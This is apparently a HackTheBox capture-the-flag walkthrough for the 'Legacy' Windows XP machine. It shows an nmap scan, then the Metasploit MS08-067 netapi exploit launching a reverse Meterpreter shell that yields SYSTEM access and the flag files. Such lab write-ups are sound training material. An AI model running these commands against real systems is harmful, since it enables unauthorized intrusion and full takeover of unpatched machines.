---
title: "Walk-through of Legacy from HackTheBox"
header:
  teaser: /assets/images/2020-05-05-22-13-16.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - SMB
  - Metasploit
  - Windows
---

## Machine Information

![Legacy](/assets/images/2020-05-05-22-13-16.png)

Legacy is a beginner level machine which demonstrates the potential security risks of SMB on Windows. Only one publicly available exploit is required to obtain administrator access.
Skills required are basic knowledge of Windows and enumerating ports and services. Skills learned are identifying vulnerable services and exploiting SMB.

<!--more-->

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu/) |
| Link To Machine | [HTB - 002 - Easy - Legacy](https://www.hackthebox.eu/home/machines/profile/2) |
| Machine Release Date | 15th March 2017 |
| Date I Completed It | 23rd July 2019 |
| Distribution used | Kali 2019.1 – [Release Info](https://www.kali.org/news/kali-linux-2019-1-release/) |

### Initial Recon

Check for open ports with Nmap:

```text
root@kali:~/htb/legacy# nmap -sC -sV -oA legacy 10.10.10.4

Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-23 14:48 BST
Nmap scan report for 10.10.10.4
Host is up (0.039s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows,cpe:/o:microsoft:windows_xp
 Host script results:
 |_clock-skew: mean: 5d00h23m48s, deviation: 2h07m16s, median: 4d22h53m48s
 |_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:7a:76 (VMware)
 | smb-os-discovery: 
 |   OS: Windows XP (Windows 2000 LAN Manager)
 |   OS CPE: cpe:/o:microsoft:windows_xp::-
 |   Computer name: legacy
 |   NetBIOS computer name: LEGACY\x00
 |   Workgroup: HTB\x00
 |_  System time: 2019-07-28T18:42:51+03:00
 | smb-security-mode: 
 |   account_used: guest
 |   authentication_level: user
 |   challenge_response: supported
 |_  message_signing: disabled (dangerous, but default)
 |_smb2-time: Protocol negotiation failed (SMB2)
```

## Method Using Meterpreter

### Gaining Access

The machine is running on Windows XP, start msfconsole and look for exploit:

```text
root@kali:~/htb/legacy# service postgresql start
root@kali:~/htb/legacy# msfconsole
```

Well known exploit for XP is netapi:

```text
msf5 > search netapi

Matching Modules
================ 
  #  Name                                 Disclosure Date  Rank    Check  Description
  -  ----                                 ---------------  ----    -----  -----------
  -     0  exploit/windows/smb/ms03_049_netapi  2003-11-11       good    No     MS03-049 Microsoft Workstation Service NetAddAlternateComputerName Overflow
  -     1  exploit/windows/smb/ms06_040_netapi  2006-08-08       good    No     MS06-040 Microsoft Server Service NetpwPathCanonicalize Overflow
  -     2  exploit/windows/smb/ms06_070_wkssvc  2006-11-14       manual  No     MS06-070 Microsoft Workstation Service NetpManageIPCConnect Overflow
  -     3  exploit/windows/smb/ms08_067_netapi  2008-10-28       great   Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
```

Says rank is great so try this:

```text
msf5 > use exploit/windows/smb/ms08_067_netapi
msf5 exploit(windows/smb/ms08_067_netapi) > options
Module options (exploit/windows/smb/ms08_067_netapi): 
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target address range or CIDR identifier
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
Exploit target: 
   Id  Name
   --  ----
   0   Automatic Targeting

msf5 exploit(windows/smb/ms08_067_netapi) > set RHOST 10.10.10.4
RHOST => 10.10.10.4
msf5 exploit(windows/smb/ms08_067_netapi) > exploit
[*] Started reverse TCP handler on 10.10.14.22:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (179779 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.22:4444 -> 10.10.10.4:1035) at 2019-07-23 15:02:01 +0100
```

### User and Root Flags

Meterpreter session connected, take a look around:

```text
meterpreter > sysinfo
Computer        : LEGACY
OS              : Windows XP (Build 2600, Service Pack 3).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > pwd
C:\
```

Exploit has connected me as System, so can get both flags:

```text
meterpreter > cat "Documents and Settings\john\desktop\user.txt"
meterpreter > cat "Documents and Settings\administrator\desktop\root.txt"
```

All done, that was nice and easy.
